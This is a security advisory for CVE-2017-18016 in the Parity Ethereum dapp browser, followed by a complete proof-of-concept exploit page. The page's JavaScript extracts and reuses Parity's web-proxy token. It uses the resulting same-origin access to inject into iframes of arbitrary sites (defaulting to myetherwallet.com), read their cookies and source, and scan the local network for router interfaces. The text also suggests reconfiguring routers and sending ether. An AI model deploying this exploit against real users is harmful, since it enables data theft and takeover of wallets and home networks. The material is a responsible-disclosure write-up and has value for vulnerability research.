@@ -1,0 +1,669 @@
+VuNote
+======
+
+    Author:     <github.com/tintinweb>
+    Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016
+    Version:    0.3
+    Date:       Jun 16th, 2017
+    
+    Tag:        parity same origin policy bypass webproxy token reuse
+
+Overview
+--------
+
+    Name:           parity
+    Vendor:         paritytech
+    References:     * https://parity.io/ [1]
+    
+    Version:        1.6.8
+    Latest Version: 1.7.12 (stable) - fixed
+                    1.8.5 (beta) - fixed
+    Other Versions: <= 1.6.10 (stable) - vulnerable
+    Platform(s):    cross
+    Technology:     rust js
+
+    Vuln Classes:   CWE-346
+    Origin:         local (remote website, malicious dapp)
+    Min. Privs.:    ---
+
+    CVE:            CVE-2017-18016
+
+
+
+Description
+---------
+
+quote website [1]
+
+>Parity Technologies is proud to present our powerful new Parity Browser. Integrated directly into your Web browser, Parity is the fastest and most secure way of interacting with the Ethereum network.
+
+Summary 
+-------
+
+PoC: https://tintinweb.github.io/pub/pocs/cve-2017-18016/ [4]
+
+> Parity Browser <=1.6.8 allows remote attackers to bypass the Same Origin Policy and obtain sensitive information by requesting other websites via the Parity web proxy engine (reusing the current website's token, which is not bound to an origin).
+
+![parity cookie](sop_cookie.gif)
+
+**(A)** Ethereum Parity's built-in dapp/web-browsing functionality is  
+rendering browser same-origin policy (SOP) ineffective by proxying 
+requests with the parity main process. As a result, any website 
+navigated to ends up being origin http://localhost:8080. This also means
+that all websites navigated to share the same origin and thus are not 
+protected by the browser SOP allowing any proxied website/dapp to access
+another proxied website/dapp's resources (Cookies, ...).
+
+//see attached PoC - index.html / PoC
+
+![parity frame](sop_frame.gif)
+
+**(B)** Worse, due to the structure of proxy cache urls and the fact that they 
+contain a reusable non-secret non-url specific cache-token it is 
+possible for one proxied website/dapp to navigate to any other proxied
+website/dapp gaining full script/XHR control due to **(A)** the SOP being
+applied without any restrictions. This could allow a malicious
+website/dapp to take control of another website/dapp, performing user
+interactions, XHR or injecting scripts/DOM elements to mislead the
+user or to cause other unspecified damage.
+
+When navigating to a website with the built-in parity webbrowser a webproxy request
+token is requested and sent along an encoded request for an url. For example, navigating
+parity to http://oststrom.com the url gets turned into a proxy url like http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDXPJWRVFDM of
+the form http://127.0.0.1:8080/web/[base32_encode(token+url)]. A malicious dapp can use
+this information to decode its own url, extract the token and reuse it for any other 
+url as the token is not locked to the url. The PoC exploits this in order to load any
+other website into a same-origin iframe by reusing the proxy token.
+
+Code see [2]
+
+//see attached PoC - index.html / PoC
+    
+
+Proof of Concept
+----------------
+
+Prerequisites: 
+
+* (if hosted locally) modify /etc/hosts to resolve your testdomain to your webserver
+* make `index.html` accessible on a webserver (e.g. `cd /path/to/index.html; python -m SimpleHTTPServer 80`)
+
+1. launch parity, navigate to the built-in webbrowser (http://127.0.0.1:8180/#/web)
+2. navigate the built-in parity webbrowser to where the PoC `index.html` is hosted (e.g. [4])
+3. follow the instructions. 
+4. Issue 1: navigate to some websites to have them set cookies, reload the PoC page and click "Display Cookies". Note that while the main request is proxied by parity, subsequent calls might not be (e.g. xhr, resources). That means you'll only see cookies set by the main site as only the initial call shares the origin `localhost:8080`.
+5. Issue 2: enter an url into the textbox and hit `Spawn SOP Iframe`. A new iframe will appear on the bottom of the page containing the proxied website. Note that the calling website has full script/dom/xhr access to the proxied target. You can also use the "Display Cookies" button from Issue 1 to show cookies that have been merged into the origin by loading the proxied iframe.
+6. Demo 2: Just a PoC to find local-lan web interfaces (e.g. your gateways web interface) and potentially mess with its configuration (e.g. router with default password on your lan being reconfigured by malicious dapp that excploits the token reuse issue 2)
+
+//tested with latest chrome
+
+ 
+Notes
+-----
+
+* Commit [3] (first in 1.7.0)
+* Does not fix Issue #1 - sites are generally put into same origin due to proxy
+* Fixes Issue #2 - Token Reuse
+* Parity now added a note that browsing websites with their browser is insecure
+
+![parity fixed](v171.png)
+
+* Issue #1 is not yet fixed as the cookie of instagram.com is still shown.
+* Parity v1.7.12 added a note.
+
+Timeline
+--------
+
+    31.05.2017 - first contact, forwarded to parity
+    17.06.2017 - provided PoC
+    19.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
+    20.06.2017 - provided more information
+    21.06.2017 - response: not critical issue due to internal browser being a dapp browser and not a generic web browser
+    21.06.2017 - response: follow-up - looking into means to lock the token to a website
+    22.06.2017 - fix ready [3]
+    10.01.2018 - public disclosure
+
+References
+----------
+
+    [1] https://parity.io/
+    [2] https://github.com/paritytech/parity/blame/e8b418ca03866fd952d456830b30e9225c81035a/dapps/src/web.rs
+    [3] https://github.com/paritytech/parity/commit/53609f703e2f1af76441344ac3b72811c726a215
+    [4] https://tintinweb.github.io/pub/pocs/cve-2017-18016/
+
+
+Contact
+-------
+
+    https://github.com/tintinweb
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="cve-2017-18016 paritytech parity same origin policy bypass sop">
+    <meta name="author" content="github.com/tintinweb">
+    <!--<link rel="icon" href="favicon.ico">-->
+
+    <title>Ethereum | Parity SOP Vulnerability</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+	<script type="text/javascript">
+	;(function(){
+
+	// This would be the place to edit if you want a different
+	// Base32 implementation
+
+	var alphabet = '0123456789ABCDEFGHJKMNPQRSTVWXYZ'.toLowerCase()
+	var alias={}
+	//var alias = { o:0, i:1, l:1, s:5 }
+
+	/**
+	 * Build a lookup table and memoize it
+	 *
+	 * Return an object that maps a character to its
+	 * byte value.
+	 */
+
+	var lookup = function() {
+		var table = {}
+		// Invert 'alphabet'
+		for (var i = 0; i < alphabet.length; i++) {
+			table[alphabet[i]] = i
+		}
+		// Splice in 'alias'
+		for (var key in alias) {
+			if (!alias.hasOwnProperty(key)) continue
+			table[key] = table['' + alias[key]]
+		}
+		lookup = function() { return table }
+		return table
+	}
+
+	/**
+	 * A streaming encoder
+	 *
+	 *     var encoder = new base32.Encoder()
+	 *     var output1 = encoder.update(input1)
+	 *     var output2 = encoder.update(input2)
+	 *     var lastoutput = encode.update(lastinput, true)
+	 */
+
+	function Encoder() {
+		var skip = 0 // how many bits we will skip from the first byte
+		var bits = 0 // 5 high bits, carry from one byte to the next
+
+		this.output = ''
+
+		// Read one byte of input
+		// Should not really be used except by "update"
+		this.readByte = function(byte) {
+			// coerce the byte to an int
+			if (typeof byte == 'string') byte = byte.charCodeAt(0)
+
+			if (skip < 0) { // we have a carry from the previous byte
+				bits |= (byte >> (-skip))
+			} else { // no carry
+				bits = (byte << skip) & 248
+			}
+
+			if (skip > 3) {
+				// not enough data to produce a character, get us another one
+				skip -= 8
+				return 1
+			}
+
+			if (skip < 4) {
+				// produce a character
+				this.output += alphabet[bits >> 3]
+				skip += 5
+			}
+
+			return 0
+		}
+
+		// Flush any remaining bits left in the stream
+		this.finish = function(check) {
+			var output = this.output + (skip < 0 ? alphabet[bits >> 3] : '') + (check ? '$' : '')
+			this.output = ''
+			return output
+		}
+	}
+
+	/**
+	 * Process additional input
+	 *
+	 * input: string of bytes to convert
+	 * flush: boolean, should we flush any trailing bits left
+	 *        in the stream
+	 * returns: a string of characters representing 'input' in base32
+	 */
+
+	Encoder.prototype.update = function(input, flush) {
+		for (var i = 0; i < input.length; ) {
+			i += this.readByte(input[i])
+		}
+		// consume all output
+		var output = this.output
+		this.output = ''
+		if (flush) {
+		  output += this.finish()
+		}
+		return output
+	}
+
+	// Functions analogously to Encoder
+
+	function Decoder() {
+		var skip = 0 // how many bits we have from the previous character
+		var byte = 0 // current byte we're producing
+
+		this.output = ''
+
+		// Consume a character from the stream, store
+		// the output in this.output. As before, better
+		// to use update().
+		this.readChar = function(char) {
+			if (typeof char != 'string'){
+				if (typeof char == 'number') {
+					char = String.fromCharCode(char)
+				}
+			}
+			char = char.toLowerCase()
+			var val = lookup()[char]
+			if (typeof val == 'undefined') {
+				// character does not exist in our lookup table
+				return // skip silently. An alternative would be:
+				// throw Error('Could not find character "' + char + '" in lookup table.')
+			}
+			val <<= 3 // move to the high bits
+			byte |= val >>> skip
+			skip += 5
+			if (skip >= 8) {
+				// we have enough to preduce output
+				this.output += String.fromCharCode(byte)
+				skip -= 8
+				if (skip > 0) byte = (val << (5 - skip)) & 255
+				else byte = 0
+			}
+
+		}
+
+		this.finish = function(check) {
+			var output = this.output + (skip < 0 ? alphabet[bits >> 3] : '') + (check ? '$' : '')
+			this.output = ''
+			return output
+		}
+	}
+
+	Decoder.prototype.update = function(input, flush) {
+		for (var i = 0; i < input.length; i++) {
+			this.readChar(input[i])
+		}
+		var output = this.output
+		this.output = ''
+		if (flush) {
+		  output += this.finish()
+		}
+		return output
+	}
+
+	/** Convenience functions
+	 *
+	 * These are the ones to use if you just have a string and
+	 * want to convert it without dealing with streams and whatnot.
+	 */
+
+	// String of data goes in, Base32-encoded string comes out.
+	function encode(input) {
+	  var encoder = new Encoder()
+	  var output = encoder.update(input, true)
+	  return output
+	}
+
+	// Base32-encoded string goes in, decoded data comes out.
+	function decode(input) {
+		var decoder = new Decoder()
+		var output = decoder.update(input, true)
+		return output
+	}
+
+	/**
+	 * sha1 functions wrap the hash function from Node.js
+	 *
+	 * Several ways to use this:
+	 *
+	 *     var hash = base32.sha1('Hello World')
+	 *     base32.sha1(process.stdin, function (err, data) {
+	 *       if (err) return console.log("Something went wrong: " + err.message)
+	 *       console.log("Your SHA1: " + data)
+	 *     }
+	 *     base32.sha1.file('/my/file/path', console.log)
+	 */
+
+	var crypto, fs
+	function sha1(input, cb) {
+		if (typeof crypto == 'undefined') crypto = require('crypto')
+		var hash = crypto.createHash('sha1')
+		hash.digest = (function(digest) {
+			return function() {
+				return encode(digest.call(this, 'binary'))
+			}
+		})(hash.digest)
+		if (cb) { // streaming
+			if (typeof input == 'string' || Buffer.isBuffer(input)) {
+				try {
+					return cb(null, sha1(input))
+				} catch (err) {
+					return cb(err, null)
+				}
+			}
+			if (!typeof input.on == 'function') return cb({ message: "Not a stream!" })
+			input.on('data', function(chunk) { hash.update(chunk) })
+			input.on('end', function() { cb(null, hash.digest()) })
+			return
+		}
+
+		// non-streaming
+		if (input) {
+			return hash.update(input).digest()
+		}
+		return hash
+	}
+	sha1.file = function(filename, cb) {
+		if (filename == '-') {
+			process.stdin.resume()
+			return sha1(process.stdin, cb)
+		}
+		if (typeof fs == 'undefined') fs = require('fs')
+		return fs.stat(filename, function(err, stats) {
+			if (err) return cb(err, null)
+			if (stats.isDirectory()) return cb({ dir: true, message: "Is a directory" })
+			return sha1(require('fs').createReadStream(filename), cb)
+		})
+	}
+
+	var base32 = {
+		Decoder: Decoder,
+		Encoder: Encoder,
+		encode: encode,
+		decode: decode,
+		sha1: sha1
+	}
+
+	if (typeof window !== 'undefined') {
+	  // we're in a browser - OMG!
+	  window.base32 = base32
+	}
+
+	if (typeof module !== 'undefined' && module.exports) {
+	  // nodejs/browserify
+	  module.exports = base32
+	}
+	})();
+	</script>
+
+	<script type="text/javascript">
+	function new_parity_proxy_url(destination){
+		//get current webproxy token (we'll just be reusing this one)
+		var url_decoded = base32.decode(document.location.search.match(/web\/(.*)$/)[1]);
+		var token = url_decoded.split("+")[0];
+		console.log(document.location);
+		console.log(url_decoded);
+		console.log(token);
+		console.log(token + "+" + destination);
+		var new_url = document.location.origin + "/web/" + base32.encode(token + "+" + destination).toUpperCase();
+		console.log(new_url);
+		return new_url;
+	}
+
+	function sop_iframe_inject (destination){
+		d = document.createElement("div");
+		d.id=destination;
+		d.style="border-style: dashed";
+		document.body.appendChild(d);
+		
+		d_data = document.createElement("div");
+		
+		i = document.createElement("iframe");
+		i.sandbox = "allow-same-origin allow-forms allow-pointer-lock allow-scripts allow-popups allow-modals";
+		i.style = "resize: both; overflow: auto;"
+		d.appendChild(i);
+		d.appendChild(d_data);
+		var proxied_url = new_parity_proxy_url(destination);
+		i.onload = function() {
+			//fix the document removing the injection script
+			
+			var doc = i.contentWindow.document;
+			var doc_html = doc.documentElement.outerHTML;
+			doc_html = doc_html.replace("<script src=\"\/parity-utils\/inject.js\"><\/script>","").replace("<\/head><body style=\"background-color: #FFFFFF;\">","");
+			doc.open();
+			doc.write(doc_html);
+			doc.close();
+		
+
+		   i.contentDocument.head.innerHTML = "<title>INJECTED</title>";
+		   // just do anything
+		   i.contentDocument.body.prepend("!--> Injected from parent frame!");
+		   d_data.innerHTML = "<br><br>";
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have full control over iframe:'+destination+'</div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames Cookie value: <pre>' + i.contentDocument.cookie + '<pre></div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames dom title: <pre>' + i.contentDocument.head.title + '<pre></div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] Child Frames window.location.href: <pre>' + i.contentWindow.location.href + '<pre></div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have prepended a body element :<b>!--> Injected from parent frame!</b></div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] we have removed inject.js from the target frame:'+destination+'<br></div>';
+		   d_data.innerHTML +='<div class="alert alert-warning" role="alert">[x] source (via xhr): <textarea>'+getUrl(proxied_url).responseText+'</textarea></div>';
+		};
+		
+		//navigate to url (poor mans location setter :p)
+		i.contentWindow.location.replace(proxied_url);
+	}
+
+	function get_lan_ip(cb){
+		window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
+		var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
+		pc.createDataChannel("");    //create a bogus data channel
+		pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
+		pc.onicecandidate = function(ice){  //listen for candidate events
+			if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
+			var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+			cb(myIP);
+			pc.onicecandidate = noop;
+		};
+	}
+
+	function getUrl(url){
+		var xhr = new XMLHttpRequest;
+		xhr.open('GET', url, false); //synchronous.
+		xhr.send();
+		return xhr;
+	};
+
+	function find_local_web_interfaces(){
+		get_lan_ip(function(local_ip){
+			/** find routers on local lan segment
+			try .1 and .254 first, otherwise bruteforce
+			**/
+			var local_ip_netpart = local_ip.split(".").slice(0,3).join(".")
+			console.log("your local ip: "+local_ip);
+			console.log("testing lan segment: " + local_ip_netpart);
+			
+			function get_candidate_ips(base){
+				var ret = new Array();
+				ret.push(1);
+				ret.push(254);
+				for(var i=2; i<254; i++){
+				   ret.push(i);
+				}
+				return ret;
+			}
+			
+			var candidate_ips = get_candidate_ips();
+			
+			for (i=0;i<candidate_ips.length;i++){
+				//synchronously. avoid dos'ing parity prx
+				var probe_ip = local_ip_netpart + "." + candidate_ips[i];
+				console.log("probing "+probe_ip);
+				var parity_probe_url = new_parity_proxy_url("http://"+probe_ip);
+				if (getUrl(parity_probe_url).status<400){
+					console.log("HIT! - "+probe_ip+" is available! " +parity_probe_url);
+					sop_iframe_inject(parity_probe_url);
+					if (document.getElementById("stop_on_first_hit").checked) return;
+				}
+			}
+		});
+	}
+
+	</script>
+</head>
+<body>
+ <!-- Fixed navbar -->
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#">Parity Vulnerability</a>
+        </div>
+        <div id="navbar" class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+            <li class="active"><a href="#">Home</a></li>
+            <li><a href="#contact">Contact</a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </nav>
+
+    <div class="container theme-showcase" role="main">
+
+      <!-- Main jumbotron for a primary marketing message or call to action -->
+      <div class="jumbotron">
+        <h1>Parity SOP Bypass</h1>
+        <p>Same-Origin Policy Bypass in Parity's Dapp Browser</p>
+      </div>
+	  <div class="well">
+        <p>
+        <b>Disclaimer</b>
+        <pre>/* This program is free software. It comes without any warranty, to
+ * the extent permitted by applicable law. You can redistribute it
+ * and/or modify it under the terms of the GNU General Public License,
+ * Version 2, as published by the Free Software Foundation. See
+ * github.com/tintinweb/pub/tree/master/pocs/cve-2017-18016/
+ * for more details. */ </pre></p>
+      </div>
+	  <p>
+        <button type="button" class="btn btn-primary" onclick="alert('Ok, thanks ;)')">I agree!</button>
+      </p>
+	  
+	<div class="jumbotron">
+		<h1 class="display-4">Issue #1</h1>
+		<p class="lead">Same-Origin Policy (SOP) bypass vulnerability due to parity proxying websites</p>
+		<hr class="my-4">
+		<div>
+			Every webpage you browse to with parity's built-in browser (http://127.0.0.1:8180/#/web) is proxied via http://127.0.0.1:8080. 
+			For example, when you browse to 
+			<ul>
+				<li>http://google.com's the websites origin changes to 127.0.0.1:8080.</li>
+				<li>Navigating to http://oststrom.com changes the origin to 127.0.0.1:8080 as it is proxied via parity.</li>
+			</ul> 
+			Both websites therefore share the same origin rendering a core feature of modern web browsers - the <b>Same-Origin Policy</b> - ineffective. 
+			A website is same-origin if <b>proto, host and port</b> (iexplore does not check port) match. 
+			Bypassing the SOP gives full control over XHR and DOM of child nodes (including iframe source) with the same origin.
+		</div>
+		<div class="alert alert-warning" role="alert">
+			<span class="badge badge-warning">Warning</span> This means, as there's only <u>one origin for all websites</u>, non domain restricted cookies are effectively shared with all websites.
+		</div>
+		<b><span class="badge badge-primary">DEMO #1</span> Cookies shared with other websites</b>
+		<ul>
+		   <li>1) using parity's built-in browser, navigate to any website to set a cookie (e.g. http://google.com)</li>
+		   <li>2) reload this this PoC (https://tintinweb.github.io/pub/pocs/cve-2017-18016/) </li>
+		   <li>3) hit the <b>Display Cookies</b> button</li>
+		</ul>
+		<p class="lead">
+			<textarea id="txtdomcookie"></textarea><br>
+			<a class="btn btn-primary btn-lg" role="button" onclick="document.getElementById('txtdomcookie').value=document.cookie">Display Cookies</a>
+		</p>
+	</div>
+	<div class="jumbotron">
+		<h1 class="display-4">Issue #2</h1>
+		<p class="lead">Parity WebProxy Token Reuse vulnerability</p>
+		<hr class="my-4">
+		<div>When navigating to a website with the built-in parity webbrowser a webproxy request token is requested and sent along an encoded request for an url. For example, navigating parity to http://oststrom.com the url gets turned into a proxy url like http://127.0.0.1:8080/web/8X4Q4EBJ71SM2CK6E5AQ6YBNB4NPGX3ME0X2YBVFEDT76X3JDXPJWRVFDM of the form http://127.0.0.1:8080/web/[base32_encode(token+url)].</div>
+		
+		<br>
+		
+		<div class="alert alert-warning" role="alert">
+			<span class="badge badge-warning">Warning</span> When navigating to http://oststrom.com the website can detect that it has been proxied by checking the location.href. 
+			It can further base32 decode and extract the web-proxy token and simply reuse it as the token is not bound to any specifiy request url or hostname allowing any website to create proxy urls and navigate to any other website.
+		</div>
+		<div class="alert alert-info" role="alert">
+			<span class="badge badge-info">Info</span> The parity webbrowser does not allow a proxied website to change the top frames location or open new windows (iframe sandbox). 
+		</div>
+		<div class="alert alert-warning" role="alert">
+			<span class="badge badge-warning">Warning</span> However, it allows to perform XHR or embed iframes with script access to proxied locations of arbitrary websites. This allows one website to control any other website since they're both same origin (Issue 1).
+		</div>
+		<div class="alert alert-info" role="alert">
+			<span class="badge badge-info">Info</span> The controlling website has full scripting access to sub-iframes potentially allowing for service enumeration attacks or simulate user interaction.
+		</div>
+		<br><br>
+		<b><span class="badge badge-primary">DEMO #2</span> Full control of arbitrary websites via token reuse and SOP bypass</b>
+		 <ul>
+		   <li>1) enter url into the textbox</li>
+		   <li>2) hit <b>Spawn SOP Iframe</b></li>
+		 </ul>
+		<b>Notes:</b>
+		 <ul>
+		   <li><span class="badge badge-light">Note</span> the current page can modify/inject arbitrary DOM/scripting into the iframe, access cookies (only the ones stored for 127.0.0.1, potentially from prevs sessions with parity), manipulate change and reload the websites content (e.g. removing parity's inject.js), get the source via XHR</li>
+		   <li><span class="badge badge-light">Note</span> some websites may not load due to js errors. However, since the website has full control it is likely the calling website can fix any js errors occuring in the subframe.</li>
+		   <li><span class="badge badge-light">Note</span> Untested but likely possible: Prepare a transaction to send off ether via parity/web3 api or xhr, open an iframe or perform requests to directly authorize (may require unlock secret) or redress the UI to clickjack the authorization or perform other actions messing with the users account</li>
+		 </ul>
+		 <br>
+		 <p class="lead">
+			<a class="btn btn-primary btn-lg" role="button" onclick="sop_iframe_inject(document.getElementById('dst').value)">Spawn SOP Iframe</a>
+			<input type=text value="http://myetherwallet.com" id="dst">
+		</p>
+	
+		 <br><br>
+		 <b><span class="badge badge-primary">DEMO #3</span> (Chrome) get local lan ip and service scan for web-enabled devices on the LAN to mess with them</b><br>
+		 e.g. search for local router interfaces with default passwords and reconfigure it to perform DNS based redirection attacks (mitm) or similar
+		 <ul>
+		   <li>1) click 'Find LAN-Local WebInterfaces' to scan for devices listening on http port 80 within your LAN (IP .1 to .254)</li>
+		   <li>2) an iframe with full control will be created for each device found on the lan</li>
+		   <li>Note: might require some fixups for the iframe conted to be loaded completely due to parity webproxy messing with header scripts or websites unable to be loaded via iframes. XHR should work though and CSRF tokens can be read from XHR requests or iframe dom (if dom based). See javascript console for debug.</li>
+		 </ul>
+		 
+		 <p class="lead">
+			<a class="btn btn-primary btn-lg" role="button" onclick="find_local_web_interfaces()">Find LAN-Local WebInterfaces</a>
+		</p>
+		<input type="checkbox" value="stop_on_first_hit" name="stop_on_first_hit" id="stop_on_first_hit"><label for="stop_on_first_hit">Stop on first device</label>
+		
+		 
+	</div>
+     
+      <div class="page-header">
+        <h1 id="contact">Contact</h1>
+      </div>
+      <div>
+		<a href="https://github.com/tintinweb">//tintinweb</a>
+      </div>
+    </div> <!-- /container -->
+</body>
+</html>
